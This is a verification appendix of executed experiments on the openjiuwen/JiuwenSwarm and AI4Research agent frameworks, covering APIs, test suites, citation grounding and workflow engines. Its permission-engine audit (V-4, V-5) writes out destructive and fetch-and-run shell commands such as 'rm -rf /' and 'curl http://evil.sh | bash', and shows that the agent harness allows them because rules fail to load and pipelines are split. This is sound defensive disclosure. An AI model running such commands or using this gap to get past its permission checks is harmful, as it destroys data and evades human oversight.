# Verification Appendix — Commands and Results

The previous revision executed neither system. This revision does. Everything below was run
in a disposable container environment; nothing touched product branches, authenticated
providers, or persistent external state.

**Evidence classes used throughout the analysis**

| Class | Meaning |
|---|---|
| **EXEC** | executed here; result reproduced below |
| **SRC** | read in source at a stated commit |
| **DOC** | stated in in-repo documentation, not independently confirmed |
| **INF** | inferred; the inference is stated |

---

## 0. Environment

| Item | Value |
|---|---|
| Host | Linux 6.18.5, x86-64, container, **running as uid 0** (matters for V-9) |
| Python | 3.11 |
| JiuwenSwarm | `suraj-subrahmanyan/jiuwenswarm` @ `a98d7ad`, branch `develop` |
| AI4Research | `Stellven/AI4Research` @ `d35c511`, branch `openJiuwen-Solar` (shallow clone, depth 50) |
| AI4Research-A / -B | default branches, docs and run-artifacts only |
| venv A | `.venv-jw` — `openjiuwen==0.1.15.post3` + `jiuwenswarm` editable `[test]` |
| venv B | `.venv-ai` — stdlib + `pyyaml`, `jsonschema`, `pytest` (AI4RnD research core) |
| venv C | `.venv-xl` — `openpyxl` (workbook extraction) |

```bash
python3 -m venv .venv-jw
./.venv-jw/bin/pip install "openjiuwen==0.1.15.post3"
./.venv-jw/bin/python -c "import openjiuwen, importlib.metadata as md; print(md.version('openjiuwen'))"
# -> 0.1.15.post3
cd jw-src && ../.venv-jw/bin/pip install -e ".[test]"
# -> Successfully installed ... jiuwenswarm-0.2.3b1 ...
```

No credentials were configured. No model provider was called. Tests requiring them are
marked **BLOCKED** below.

---

## V-1 · openjiuwen Rail API — the real shape

**Question.** The previous analysis inferred the Rail API from JiuwenSwarm's in-tree rails
because `openjiuwen` was unavailable. Is the inference correct?

```bash
./.venv-jw/bin/python exp1_rail_ability.py
```

**Result — CONFIRMED, with detail the previous analysis did not have:**

```
AgentRail.priority default : 50
has init/uninit            : True True
init signature             : (self, agent)
DeepAgentRail MRO          : ['DeepAgentRail', 'AgentRail', 'ABC', 'object']
events                     : 11 ['before_invoke', 'after_invoke', 'before_task_iteration',
                                'after_task_iteration', 'after_react_iteration',
                                'before_model_call', 'after_model_call', 'on_model_exception',
                                'before_tool_call', 'after_tool_call', 'on_tool_exception']
```

Corrections to the previous revision:
- There are **11** lifecycle events, not 10 — `after_react_iteration` was missing from the
  documentation table in `docs/en/Harness.md`.
- `AgentRail` is at `openjiuwen/core/single_agent/rail/base.py:456`; `init`/`uninit` at
  481/484; `priority: int = 50` at 479.
- `DeepAgentRail` (`openjiuwen/harness/rails/base.py:28`) adds only the two task-iteration
  hooks and `set_workspace` / `set_sys_operation`.
- `get_callbacks()` filters to *overridden* methods only, via `_is_base_method`.

---

## V-2 · Can an out-of-tree Rail register AND invoke an ability? ⭐

**Question.** This is the assumption the entire recommended architecture rested on
(previously "A4 — if wrong, Option D collapses").

**Result — PASS.** Full transcript:

```
== B. Define an out-of-tree research tool + rail ==
  LocalFunction built        : LocalFunction
  card.name                  : research_evidence
  card.input_params          : {'type':'object','properties':{'claim_id':{'type':'string'}},
                                'required':['claim_id']}
  card.stateless             : False

== C. Register onto a bare AbilityManager ==
  add_ability result         : AddAbilityResult(name='research_evidence', added=True,
                                                reason='added_tool')
  ability listed             : ['research_evidence']

== D. Invoke the registered tool through the resource manager ==
  resolved tool              : LocalFunction
  INVOKE RESULT              : evidence_for::C014     <-- real execution

== F. uninit ==
  removed abilities          : ok
  remaining abilities        : []

EXPERIMENT 1: PASS
```

**Findings.**
- `add_ability(card, tool)` is at `ability_manager.py:343`; `remove_ability` at 379.
- Correct construction is `LocalFunction(card=ToolCard(...), func=fn)` — `card` is a
  **required positional argument**, contrary to what the in-tree call sites suggest at a
  glance.
- Stateful tools (`card.stateless=False`, the default) get an agent-qualified id
  `f"{name}_{owner_id}"` and are registered with `refresh=True`; stateless tools keep a bare
  id and are `skip_if_exists`. **An integration Rail must decide this deliberately** — a
  research toolkit holding a service client should be stateful.

**Consequence.** The out-of-tree Rail seam is real and load-bearing. It is confirmed as an
integration mechanism for tools and lifecycle hooks.

---

## V-3 · Permission engine — severity mapping ⭐

```bash
./.venv-jw/bin/python exp2b_permissions.py
```

**Result — the documented mapping is exactly correct:**

| mode | LOW | MEDIUM | HIGH | CRITICAL |
|---|---|---|---|---|
| `normal` | ALLOW | ALLOW | ASK | ASK |
| `strict` | ALLOW | ASK | ASK | **DENY** |

Also confirmed:
- `tools.<name>: deny` → `PermissionLevel.DENY`, rule `tools.bash` — returns immediately.
- An explicit `action: allow` on a `CRITICAL` rule yields ALLOW even in `strict` mode —
  explicit action overrides severity, as documented.
- Correct call shape is `evaluate_tiered_policy(permissions_section, tool_name, tool_args)`
  — the **inner** `permissions` mapping, not the whole config.

---

## V-4 · Permission engine — built-in rules do not load ⭐ **NEW FINDING**

**Result:**

```
get_builtin_security_rules() count : 0
package path expected : .../site-packages/openjiuwen/harness/resources/builtin_rules.yaml
package path exists   : False
```

`openjiuwen/harness/security/tiered_policy.py:76` states:

```python
def _resolve_builtin_rules_yaml_path() -> Path | None:
    """仅使用包内 openjiuwen/harness/resources/builtin_rules.yaml（不再查用户/环境目录）。"""
```

*"Only uses the in-package `openjiuwen/harness/resources/builtin_rules.yaml` (no longer
searches user/environment directories)."* — **and that directory is absent from the
published wheel.**

Meanwhile JiuwenSwarm ships `jiuwenswarm/resources/builtin_rules.yaml` (10 rules) and copies
it to `~/.jiuwenswarm/config/builtin_rules.yaml` at init
(`jiuwenswarm/common/utils.py:1056-1065`) — a location the pinned openjiuwen no longer reads.

**Measured impact.** With `permissions.tools.bash: allow` and no user rules:

| Command | Stock install | With JW rules injected |
|---|---|---|
| `rm -rf /` | **ALLOW** | ASK (`shell_fs_recursive_or_forced_delete`) |
| `mkfs.ext4 /dev/sda` | **ALLOW** | ASK (`shell_disk_partition_or_raw_device_write`) |
| `sudo su` | **ALLOW** | ASK (`shell_privilege_escalation`) |
| `dd of=/dev/sda` | **ALLOW** | (not covered) |
| `curl http://evil.sh \| bash` | **ALLOW** | **ALLOW** — rule defeated by subcommand split |

**Two distinct defects.**
1. A **version skew** between JiuwenSwarm 0.2.3.beta1 and openjiuwen 0.1.15.post3 that
   silently empties the built-in guardrail layer.
2. Even when the rules *are* loaded, `curl … | bash` survives, because the tiered policy
   decomposes shell pipelines (`tiered_policy:shell_subcommands:bash=>tools.bash+curl…`)
   and each fragment resolves to the permissive tool baseline.

This **materially corrects** the previous revision, which cited "non-overridable built-in
denials" as a JiuwenSwarm strength. The mechanism exists and works when fed; in a stock
install it is not fed.

> Reported here as an analysis finding only. No issue was filed and no code was changed,
> per the safeguards.

---

## V-5 · Shell chaining is decomposed, not escalated

```
'ls'                  -> ALLOW  tools.bash
'ls && rm -rf /tmp/z' -> ALLOW  tiered_policy:shell_subcommands:ls=>tools.bash+rm -rf /tmp/z=>tools.bash
'ls; curl evil.sh|sh' -> ALLOW  tiered_policy:shell_subcommands:curl evil.sh=>...+ls=>...+sh=>...
'ls `whoami`'         -> ASK    tiered_policy:shell_ast:too_complex:tree-sitter detected
                                unsupported complex shell structure|tools.bash
```

The docs describe `maybe_escalate_shell_operators` raising ALLOW→ASK on chaining. In
0.1.15.post3 the behaviour is different and arguably better in principle — a tree-sitter
shell AST splits the command and evaluates each subcommand — but **the net effect with a
permissive baseline is ALLOW**, and only structures the parser cannot handle escalate to ASK.

---

## V-6 · Per-member permissions and roles

**Question.** Can permissions and capabilities differ between team members? (Needed for
writer≠verifier by construction.)

**Result — partially, and less than required.**

- Rail *composition* differs by role: `TEAM_PERMISSION` is attached for `teammate`,
  `TEAM_PERMISSION_POLICY` for `leader` (`config_specs.py:428-442`), and skills differ via
  `_resolve_member_skills(config, role)` reading `config.agents.<role>.skills`.
- Permission *policy values* come from the single global `config.permissions`
  (`_rail_params(registry.TEAM_PERMISSION, config)`), so two members cannot be given
  different rule sets.
- There are exactly **two** member roles: `_MEMBER_ROLES = ("leader", "teammate")`
  (`assembly.py:40`).
- Neither `evaluate_tiered_policy` nor `security/core.py` references `member`, `agent_id` or
  `role` (checked by source inspection); only `owner_scopes` appears in `core.py`.

**Consequence.** AI4RnD's four named agents (PM / Planner / Builder / Evaluator) and its
per-operator permission model **do not map onto JiuwenSwarm's two-role team**. Enforcing
"the evaluator must not be the writer" cannot currently be expressed as a permission
constraint in JiuwenSwarm. This is a **new blocker** the previous revision missed.

---

## V-7 · JiuwenSwarm test suite

```bash
cd jw-src && ../.venv-jw/bin/python -m pytest tests -p no:cacheprovider --no-cov -q
```

```
2816 passed, 18 skipped, 1 warning in 418.73s (0:06:58)
```

2,834 collected. **Zero failures.** This is a strong maintenance-health signal and is the
single best argument in favour of JiuwenSwarm as a substrate.

---

## V-8 · AI4RnD module maturity by execution ⭐

48 architecturally significant modules probed for: does it import (stdlib + pyyaml only), is
it referenced by the live runtime (`coordinator.sh`, `solar-harness.sh`, `graph_scheduler`,
`graph_node_dispatcher`, `multi_task_runner`), and is it referenced by tests.

```
import OK 48/48 | wired 29/48 | tested 43/48
```

**Everything imports.** The 19 unwired modules are the finding:

| Implemented, tested, **not wired** | LOC |
|---|---|
| `capability_capsules` | 1351 |
| `capsule_execution_gate` | 194 |
| `skill_to_capsule_compiler` | 323 |
| `capability_token` | 105 |
| `logical_operator_registry` | 33 |
| `physical_operator_catalog` | 100 |
| `operator_router` | 305 |
| `operator_state_machine` | 233 |
| `task_graph_io` | 351 |
| `task_graph_state_io` | 491 |
| `evidence_ledger` | 117 |
| `event_ledger` | 198 |
| `actor_registry` / `actor_lease` / `actor_mailbox` / `actor_runtime` | 382 / 238 / 102 / 329 |
| `context_store`, `solar_db` | 58 / 41 |

The `actor_*` family is a durable actor model with registry, leases and mailboxes — directly
relevant to Harness Core features 2 and 4 — sitting unused.

---

## V-9 · AI4RnD test suites

Full-suite collection aborts: `tests/test_youtube_influence_digest_quality.py` imports a
script that calls `raise SystemExit(2)` at module level, producing a pytest
`INTERNALERROR`. Targeted subsets were run instead.

| Suite | Result |
|---|---|
| `tests/graph` | **321 passed** (67s) |
| `tests/evaluators` | **104 passed** (220s) |
| `tests/gate_ledger` | **124 passed, 2 failed** |
| `tests/experience` | **7 passed** |
| `tests/evolution`, `tests/control_plane` | no Python tests (shell-based) |

**The 2 failures are environment artifacts, not defects.** Both assert that a write fails in
a directory made read-only with `os.chmod(target, 0o500)`; the container runs as uid 0, and
root bypasses permission bits:

```
os.chmod(target, 0o500)
>  assert rec is None
E  AssertionError: assert {'record_id': ..., 'kind': 'gate_check', ...} is None
```

**Total observed: 556 passed, 2 environment-failed.** The scheduler, evaluator and
gate-ledger cores are genuinely exercised.

---

## V-10 · AI4RnD research core runs standalone ⭐

No Solar runtime, no `HARNESS_DIR`, stdlib + pyyaml only:

```bash
python lib/research/cli.py init "$DB" --topic "Transformer efficiency" --depth-tier standard
python lib/research/cli.py add-source "$DB" --run-id "$RID" --title FlashAttention --text "..."
python lib/research/cli.py extract "$DB" --run-id "$RID" --source-id "$SID"
python lib/research/cli.py ledger  "$DB" --run-id "$RID"
python lib/research/cli.py mine    "$DB" --run-id "$RID"
```

```
Initialized research DB  · 7 tables: research_runs, research_sources, evidence_items,
                            claims, claim_evidence, report_sections, section_checks
Source added: 6697dbc0...  Content hash: ec607d44cee4f586...
Evidence extracted: ev_6c000678c02551b2   Span: [0, 150)
Evidence items: 1
Claim mining ... Claims: 3   Claim-evidence links: 3
```

**Confirms the port is cheap.** Deterministic ids, SHA-256 content hashing and character
spans all work outside the harness. Resolves prior spike E3.

---

## V-11 · Capability capsules execute and validate ⭐

```bash
HARNESS_DIR=$(pwd) PYTHONPATH=lib python -c "import capability_capsules as cc; ..."
```

```
registry entries: 30
manifests VALID: 23   INVALID: 0

contract              : ['inputs','outputs','preconditions','postconditions','invariants']
composition           : ['consumes','produces','compatible_with','incompatible_with','requires_after']
effects               : ['read','write','execute','network','cost']
bindings              : ['skills','mcp_capabilities','data_refs','secret_refs','required_guard_capsules']
verification          : ['self_check','external_verifier','pass_conditions']
operator_compatibility: ['preferred','forbidden']
provenance            : ['owner','created_at','manifest_path']
```

**This settles the "capsules are not renamed skills" question by execution.** Note
`bindings.skills` — a skill is an *ingredient* of a capsule.

Also confirmed: `capsule_execution_gate` exposes `check_cooldown`, `check_idempotency`,
`GateDecision`, `IdempotencyResult` — real pre-dispatch gating, unwired.

---

## V-12 · Citation grounding quality — MEASURED ⭐ **decisive**

**Question.** Prior spike E8: is `_jaccard`-based grounding good enough to support the claim
that AI4RnD output is verified?

**Mechanism found.** Grounding does not use Jaccard at all. `evaluator.py:443-476`:

```python
overlap = sorted(context_tokens & evidence_tokens)
checks.append({..., "ok": bool(overlap), ...})
```

A citation is "grounded" if the citing line shares **one** token (≥3 chars, per
`TOKEN_RE = [A-Za-z0-9_\-]{3,}|[一-鿿]{2,}`) with the evidence text. `_jaccard` is
used elsewhere, for source diversity.

**Measurement.** One evidence item; nine citing sentences hand-labelled for actual support:

| Verdict | Truth | Overlap tokens that carried it |
|---|---|---|
| GROUNDED | ✅ true | achieves, and, flashattention, gpt-2, io-aware, speedup, training |
| GROUNDED | ✅ true | and, between, flashattention, gpu, hbm, memory, reads, reduces |
| GROUNDED | ❌ **false** | `flashattention` — "…is an approximation that trades accuracy for speed" |
| GROUNDED | ❌ **false** | achieves, flashattention, speedup — "…100x speedup on GPT-4" |
| GROUNDED | ❌ **false** | method, the — "…substantially slower than standard attention" |
| GROUNDED | ❌ **false** | `flashattention` — "…was invented in 1823 by Napoleon Bonaparte" |
| GROUNDED | ❌ **false** | `and` — "**Bananas are yellow and grow in tropical climates**" |
| GROUNDED | ❌ **false** | and, memory, method, the, training |
| FLAGGED | ❌ false | `[]` — "Nothing whatsoever relates here xyzzy plugh frobnicate" |

```
PRECISION of 'grounded'      = 0.25   (6 of 8 passes are wrong)
DETECTION of unsupported     = 1/7 = 0.14
```

**Only a sentence sharing literally zero tokens is flagged.** A fabricated claim survives on
a single content word; an unrelated sentence survives on the stopword "and".

**Corroborating search.** No entailment machinery exists anywhere in AI4RnD — a
word-boundary search for `entail`, `NLI`, `entailment`, `cross_encoder`, `CrossEncoder`,
`deberta`, `mnli` across `harness/lib/**/*.py` returns **zero** matches.

**Consequence.** AI4RnD's Evidence/Factuality evaluator (feature 70) does not currently
verify grounding in any meaningful sense. The ledger, spans and hashing are sound — the
*judgement* on top of them is not. This is the most important single correction in this
revision, and it moves real entailment from "Stage 5 hardening" to **Stage 1 blocking work**.

---

## V-13 · RSI — GEPA is real and unwired ⭐

```bash
HARNESS_DIR=$(pwd) PYTHONPATH=.:lib python -m integrations.gepa_optimizer.cli --help
HARNESS_DIR=$(pwd) PYTHONPATH=lib python lib/evolution_engine.py scorecard --json
```

`integrations/gepa_optimizer/` — **3,540 LOC**, 11 modules, with the complete controlled-
improvement lifecycle:

```
propose  Analyse target and print an optimisation proposal (no mutations).
run      Run the GEPA optimiser (dry-run by default; use --execute for real run).
review   Show candidates and Pareto front from a completed run.
promote  Promote a candidate to the target path (must be under /tmp).
rollback Roll back the last promotion at the given target path.
status   Show status of a run directory or list recent runs.
```

Its safety contract is genuinely strong:
- dry-run default; `--execute` **rejected unless all three** of `--max-evals`, `--max-spend`,
  `--max-walltime` are supplied;
- promotion target must be under `/tmp`; production paths rejected;
- `hard_policy_checker.py` freezes core safety policy — candidates may not relax
  `secrets_access`, `git_push`, `destructive_shell`, `payment_action`,
  `external_api_write`.

`evolution_engine.py` also executes (`scorecard` / `recommend` / `promote` / `demote-degraded`
/ `status`) but tracks exactly **one** capability (`deepresearch.quality_gate`) with 0
terminal nodes and 0 examples.

**Neither is referenced by `coordinator.sh` or `solar-harness.sh`.**

**RSI coverage across the eight target classes** (word-boundary search):

| RSI target | Named methods | Present? |
|---|---|---|
| 1 Text artifacts | GEPA / MIPROv2 / TextGrad | **GEPA yes (19 files)**; MIPROv2 0; TextGrad 0 |
| 2 Runtime routing | Bayesian opt / bandits | **0** |
| 3 Capsules & operators | trajectory mining / CEGIS / Voyager | partial (`skill_to_capsule_compiler`); CEGIS 0, Voyager 0 |
| 4 DAG & organisation | AFlow / MCTS / ADAS | **0** |
| 5 Evaluator & governance | judge calibration / reward modelling | **0** |
| 6 Memory & evidence | Self-RAG / reranker training | **0** |
| 7 Model weights | SFT / LoRA / DPO / GRPO | **0** (matches are persona markdown + a report appendix) |
| 8 Data & benchmarks | active learning / hard-case mining | partial (`failure_miner`, 109 LOC) |

**One of eight surfaces is implemented, and it is not connected.**

---

## V-14 · openJiuwen-DeepSearch overlap — prior risk R5 resolved ⭐

Prior revision flagged this as possibly invalidating the whole integration case.

```
scripts/main.py            337 LOC
grep -c "citation|evidence|claim|provenance" scripts/main.py  ->  0
```

The skill is a thin wrapper (`run_jiuwen_workflow`, `execute_deep_search`,
`run_background`) around an openjiuwen workflow, producing Markdown/Doc/HTML after ~15
minutes. It has **no** evidence ledger, claim model, citation span, source authority scoring,
or gate.

**Conclusion: not a competitor to the intended AI4RnD product.** They are different classes
of artifact — a generated report versus an audited evidence bundle. Prior risk R5 is
**downgraded from High to Low**. (The converse also holds: DeepSearch is not a starting
point for feature 70 either.)

---

## Blocked tests

| Test | Why |
|---|---|
| Live model routing / provider selection | requires provider credentials — safeguard: no paid or authenticated providers |
| End-to-end JiuwenSwarm chat with a real agent | requires a model endpoint |
| jiuwenbox sandbox enforcement (bwrap/cgroup) | requires kernel privileges unavailable in this container |
| RailManager hot-reload against a **live** `DeepAgent` | requires a running agent server with a model backend; V-2 verified the mechanism against a real `AbilityManager` instead |
| Rail survival across agent-cache invalidation and restart | same dependency; **remains open** — see [10](10-risks-assumptions-open-questions.md) Q17 |
| GEPA `run --execute` | would spend model budget; only `--help` and `status` were run |
| AI4RnD tmux dispatch path | requires tmux + agent CLIs + credentials |
| Full AI4RnD suite | collection aborts (`SystemExit` at import); subsets run instead |

---

## Summary of corrections to the previous revision

| # | Previous claim | Corrected finding | Class |
|---|---|---|---|
| 1 | Rail seam "Medium-High confidence, not executed" | **Verified by execution** — register + invoke + uninit all work | EXEC |
| 2 | 10 rail lifecycle events | **11** — `after_react_iteration` was undocumented | EXEC |
| 3 | Permission engine has "non-overridable built-in denials" as a strength | **Built-in rules load 0 in a stock install**; `rm -rf /` returns ALLOW | EXEC |
| 4 | Shell chaining escalates ALLOW→ASK | Chaining is **decomposed**; net effect ALLOW | EXEC |
| 5 | Per-member permissions assumed feasible | **Only two roles; policy is global** — writer≠verifier not expressible | SRC |
| 6 | Capsules ≈ skills, dismissed | **Formal 11-section contract**; 30 registered, 23 validated | EXEC |
| 7 | RSI "largely aspirational" | **GEPA is 3,540 LOC with a full promote/rollback lifecycle**, unwired | EXEC |
| 8 | Grounding "precision unknown, spike E8" | **Precision 0.25 / detection 0.14**, measured | EXEC |
| 9 | DeepSearch might invalidate the case (risk R5, High) | **Zero evidence machinery** — risk downgraded to Low | EXEC |
| 10 | AI4RnD maturity judged by reading | **48/48 import, 29/48 wired** — 19 implemented-but-unwired modules found | EXEC |
| 11 | JiuwenSwarm health unknown | **2,816 tests pass, 0 fail** | EXEC |
| 12 | AI4RnD test health unknown | **556 pass, 2 root-environment artifacts** | EXEC |

---

# Revision 3 — Jiuwen execution-mechanism probes

Same environment as V-1…V-14 (`.venv-jw`, `openjiuwen==0.1.15.post3`, `jiuwenswarm` editable).

## V-15 · Core Workflow and the Pregel engine exist and build ⭐

```bash
./.venv-jw/bin/python exp3_workflow.py
```

```
AgentRail/Pregel primitives
  PregelBuilder methods : ['add_branch', 'add_edge', 'add_node', 'build']
  Channel contract      : ['is_ready', 'accept', 'consume', 'snapshot', 'restore']
  BarrierMessage exists : True | GraphInterrupt: True
  PregelLoop members    : ['_is_resume', '_run_step', '_save_state_on_error', 'init', 'run_step']

Built a fan-out + barrier graph
  build() signature     : (store=None, after_step_callback=None)
  built Pregel          : Pregel
  run() signature       : (config) -> None | dict | dict[str, Interrupt | tuple[Interrupt,...] | None]

Core Workflow API — all present
  set_start_comp · add_workflow_comp · set_end_comp · add_connection ·
  add_stream_connection · add_conditional_connection · invoke · stream · draw
  router type: Callable[..., Hashable | list[Hashable]]        <-- dynamic fan-out

Components
  flow      ['branch_comp','branch_router','end_comp','start_comp','workflow_comp']
  llm       ['intent_detection_comp','llm_comp','questioner_comp']
  tool      ['tool_comp']
  resource  ['knowledge_retrieval_comp','memory_retrieval_comp','memory_write_comp']
  condition ['array','condition','expression','number']

Checkpointer hooks
  pre/post_workflow_execute · pre/post_agent_execute · pre/post_agent_team_execute ·
  interrupt_agent_execute · session_exists · release · graph_store
Storage contract: save · recover · clear · exists
```

**Findings.** A Pregel bulk-synchronous engine with channel `snapshot`/`restore`, barrier
messages, graph interrupts and resume detection sits under Core Workflow. `workflow_comp`
makes workflows nestable. Conditional routers may return a **list**, giving runtime fan-out.

**This is the finding that overturns Revision 2's Stage 3.** See
[15-correction-log.md §1](15-correction-log.md) and [17-taskgraph-verdict.md](17-taskgraph-verdict.md).

## V-16 · SwarmFlow script contract — META purity and determinism lint ⭐

```bash
./.venv-jw/bin/python exp5_swarmflow.py   # then direct calls to loader
```

```
extract_workflow_meta(source, filename) -> dict
load_workflow_meta(path) -> dict
load_workflow_source(path) -> LoadedWorkflow

_BANNED_MODULE_CALLS: {'time': {'time','monotonic','perf_counter','time_ns','monotonic_ns'},
                       'random': None, 'uuid': None}
_BANNED_ATTRS       : {'now','today','utcnow'}
_THUNK_CALLEES      : {'agent','workflow'}

sfprobe/good.py                 -> OK {'name':'evidence-sweep','description':'demo',
                                       'phases':['search','extract']}
sfprobe/bad_meta.py             -> REJECTED MetaError: `META` must be a pure literal
                                   (no names/calls/concatenation)
```

**Findings.** A SwarmFlow workflow is ordinary Python with a pure-literal `META` and
`async def run(args)`. Purity is enforced by `ast.literal_eval` — executed and confirmed by
rejection. The loader lints determinism hazards because the engine replays from a journal.

Source-confirmed alongside: `Journal` (WAL, `call_signature`, `get_cached`, `hits`),
`SemaphoreAdmission` / `ConcurrencyGovernor`, `SwarmflowTool.run_background` + `resume_id`,
`BackgroundTaskController.pause/resume`, `_check_abort`, `WorkflowProgressEvent`.

**Exposure:** `SWARMFLOW_ENABLED_CONFIG_PATH = ("modes","team","jiuwen_team","enable_swarmflow")`
— a config flag inside team mode, with phases projected to `team.task` / `team.member`
(`team_helpers.py:2159-2288`). Users never select SwarmFlow.

## V-17 · openjiuwen has a self-evolution framework ⭐

```bash
./.venv-jw/bin/python exp4_evolving.py
```

```
Operator (core/operator/base.py)
  docstring       : "Base class for self-evolution parameter handles."
  explicitly      : "Operator is NOT an executable unit."
  abstract methods: ['get_state','get_tunables','load_state','operator_id','set_parameter']
  TunableSpec     : ('name','kind','path','constraint')
  kinds shipped   : llm_call · memory_call · skill_call · tool_call

Evaluation
  Case            : ['inputs','label','tools','case_id']
  EvaluatedCase   : ['case','answer','score','reason','per_metric']
  metrics         : ['exact_match','llm_as_judge','base']

Trainer
  train(agent, train_cases, val_cases, ...)
  _select_best_candidate_on_val(agent, operators, candidates, val_cases)
  _snapshot_operators_state / _restore_operators_state
  _save_checkpoint_if_needed(improved=) / _resume_if_needed
  apply_updates(operators, updates) / evaluate -> (score, [EvaluatedCase])

Updater  : bind · process · update · requires_forward_data · get_state · load_state
           impls: single_dim, multi_dim          <-- credit assignment
Signals  : from_eval · from_conv · team
agent_rl : offline/ online/{gateway,inference,judge,launcher,rail,scheduler}
           rl_trainer/{ppo_step, verl_converter, verl_executor} · reward.py
Checkpointing: EvolutionStore(append_record, archive_evolutions, archive_skill_body,
               create_skill, ensure_skill_id, ...) · skill_package(pack/unpack/install)
Sharing  : hub_client · experience_sharer · share_stager
```

**Findings.** Candidate generation, validation-set selection, snapshot/rollback, freeze
markers, credit assignment, evaluation datasets, LLM-judge metrics and PPO-based RL all exist.

**Revision 2 declared six of eight RSI surfaces "absent from both systems" after searching only
AI4RnD.** Corrected: one of eight is absent (RSI-4, DAG/agent-organisation search). See
[15 §2](15-correction-log.md) and [18-evolution-governance.md](18-evolution-governance.md).

## V-18 · The "Operator" naming collision

| | openjiuwen `Operator` | AI4RnD "operator" |
|---|---|---|
| Definition | tunable-parameter handle for self-evolution | executable work unit / worker |
| Source | *"Operator is NOT an executable unit. Execution is handled by the consumer (Agent)"* | `logical-operators.json`, `physical-operators.json` |
| Interface | `get_tunables`, `set_parameter`, `get_state`, `load_state`, `operator_id` | `required_capabilities`, dispatch, quota, health |

**EXEC.** Resolution adopted: AI4RnD's executable units are renamed **Step** (logical) and
**Runner** (physical); "Operator" is reserved for openjiuwen's meaning.

## V-19 · Mechanism comparison, consolidated

Full table: [16 §10](16-jiuwen-execution-mechanisms.md#10-comparison-table). The three rows
where every Jiuwen mechanism scores ✗ and AI4RnD scores ✅:

- typed contracts / evidence requirements on nodes
- capability routing with honest stall
- write-scope conflict exclusion

These are the entire justification for AI4RnD-owned runtime code. Revision 3 sized that at
"~450 LOC"; **Revision 4 withdraws the figure** — see V-21 to V-24, which found reachability gaps
the estimate did not cover. The ~5,200 LOC Revision 2 planned to port is a measured count of
existing AI4RnD code and stands as a fact about what exists.

---

## Revision 3 corrections table

| # | Revision 2 claim | Corrected finding | Class |
|---|---|---|---|
| 13 | AI4RnD must port `graph_scheduler` (4,189 LOC) | Pregel + Core Workflow + SwarmFlow provide ~85% of it | EXEC |
| 14 | Durable queue + leases are "a real gap in JiuwenSwarm"; port `actor_*` | `ConcurrencyGovernor`, `SemaphoreAdmission`, `Journal`, `BackgroundTaskController` already provide it | EXEC/SRC |
| 15 | RSI surfaces 2,4,5,6,7,8 absent from both systems | only RSI-4 is absent; `agent_evolving` covers the rest | EXEC |
| 16 | RSI needs ~16 weeks of construction | ~6–8 weeks, mostly binding + approval surface | derived |
| 17 | "Operator" had three colliding meanings (all inside AI4RnD) | four — openjiuwen adds one with the opposite sense | EXEC |
| 18 | JiuwenSwarm covers 20/142 features fully | **23/142 FULL**, NONE 72→62, after the mechanism inventory | derived |
| 19 | Recommended a separate service with its own scheduler | in-process project subsystem compiling to Jiuwen mechanisms | derived |

## Blocked in Revision 3

| Test | Why |
|---|---|
| End-to-end Core Workflow `invoke()` with a live model | needs provider credentials |
| SwarmFlow `run()` with real agents | needs a team runtime + credentials |
| Checkpointer persistence across a real restart | needs a configured KV backend — **Q24** |
| `Trainer.train` on real cases | needs credentials and a golden set |
| Write-scope admission prototype | design work, not yet built |


---

# Revision 4 experiments — V-20 to V-27

Every experiment below was run in this environment against
`openjiuwen 0.1.15.post3` in the `.venv-jw` virtual environment, and against the AI4Research tree
at `d35c511`. Where a claim could not be executed it is labelled `SRC` and says so.

---

## V-20 (EXEC) — the workbook is the controlling source, read directly

```
openpyxl.load_workbook("AI4RnD Feature List.xlsx", data_only=True)
```

| Sheet | L1 groups | L2 rows |
|---|---:|---:|
| Workflow Features | 9 | 54 |
| Foundation Features | 10 | 65 |
| Vertical Features | 6 | 23 |
| **Total** | **25** | **142** |

Cross-check against the Revision 3 CSV, position by position, after stripping the numeric prefix
and normalising case and punctuation: **0 mismatches across all 142 rows.** The prior row set was
correct. See [15-correction-log.md](15-correction-log.md) §9.8.

---

## V-21 (EXEC) — the leader-facing SwarmFlow tool rejects `resume_id` and `name`

```python
t = SwarmflowTool(parent_agent=None, messager=None, team_name="t",
                  model_resolver=None, concurrency_governor=None, language="en")
```

```
declared params: ['args', 'name', 'resume_id', 'script', 'script_path']
  no args              success=False error=one of 'script_path' / 'script' / 'name' / 'resume_id' is required
  resume_id only       success=False error='resume_id' is not supported yet; provide 'script_path' or inline 'script'
  name only            success=False error='name' is not supported yet; provide 'script_path' or inline 'script'
  resume_id + name     success=False error='name' is not supported yet; provide 'script_path' or inline 'script'
  inline script        success=False error=Swarmflow concurrency governor is not configured
```

**Finding.** Two of five advertised parameters are unimplemented. The tool is honest at runtime —
it never silently no-ops — but an agent cannot resume a workflow. `_relaunch` is a control-plane
call by design (`tool_swarmflow.py`: *"resume is a control-plane action, not a new tool_use decided
by the LLM"*).

The last line also shows admission is a hard precondition, not a queue: with no governor the tool
refuses rather than running unmetered.

---

## V-22 (EXEC) — journal replay works, and a failed step degrades to `None`

A two-step script (`step-A`, `step-B`) run three times against a backend that fails `step-B` on
the first run only:

| Run | Live backend calls | Result | Journal entries |
|---|---|---|---|
| 1 — `step-B` fails | `['step-A','step-B','step-B','step-B']` | `{'a': 'result(step-A)', 'b': None}` | 1 |
| 2 — resume | `['step-B']` | `{'a': 'result(step-A)', 'b': 'result(step-B)'}` | 2 |
| 3 — replay | `[]` | same | 2 |

**Two findings.**

1. **Resume and replay are genuine.** Run 2 re-executed only the failed step. Run 3 executed
   nothing. This is real, verified reuse.
2. **A failed step returns `None` and the run reports success.** After `rt.retries + 1` attempts
   the engine emits `agent_failed` and `agent()` returns `None`
   (`engine/primitives.py` ~line 362). Nothing propagates. For a gate that must decide whether a
   claim holds, this is a correctness hazard: *the run completed* is not evidence that *its steps
   did*.

---

## V-23 (EXEC) — `agent_type` is validated, forwarded, then ignored

```
backend saw t1  opts={'agent_type': 'researcher', 'label': 'typed'}
backend saw t2  opts={'model': 'no-such-model-xyz', 'label': 'modelled'}
result bogus:   WorkflowError: unknown option(s) ['totally_unknown_key'];
                allowed: ['agent_type','isolation','label','model','phase','schema','timeout']
```

The engine fails fast on a typo and forwards `agent_type` faithfully. But
`grep -rn agent_type openjiuwen/agent_teams/workflow/backends/` returns **nothing**, and no backend
overrides `KNOWN_OPTIONS`. So `agent_type` reaches the production backend and is dropped.

**Named `agent_type` execution is not wired.** A typo is louder than an unimplemented feature.

---

## V-24 (SRC) — unknown per-call model silently substitutes

`openjiuwen/agent_teams/models/allocator.py`, `resolve_member_model`, lines 417–423:

```python
if not team_spec.model_pool or not model_name:
    return None
group = [e for e in team_spec.model_pool if e.model_name == model_name]
if not group:
    return None
